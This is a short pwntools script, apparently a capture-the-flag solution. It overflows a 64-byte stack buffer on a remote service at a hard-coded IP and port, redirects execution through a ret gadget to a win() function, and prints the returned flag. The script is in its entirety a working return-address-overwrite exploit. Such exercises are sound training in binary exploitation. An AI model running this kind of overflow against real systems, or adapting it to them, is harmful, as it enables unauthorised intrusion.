from pwn import *
import time

context.arch = 'amd64'

win = 0x4011b6       # win() function address
ret = 0x40101a       # ret gadget for stack alignment

p = remote('51.79.140.18', 10368)
p.recvuntil(b'> ')

payload = b'A' * 72            # 64 buf + 8 saved rbp
payload += p64(ret)            # stack alignment
payload += p64(win)            # jump to win()

p.send(payload)
time.sleep(1)
flag = p.recv(timeout=3)

print(f"Flag: {flag.decode().strip()}")
p.close()
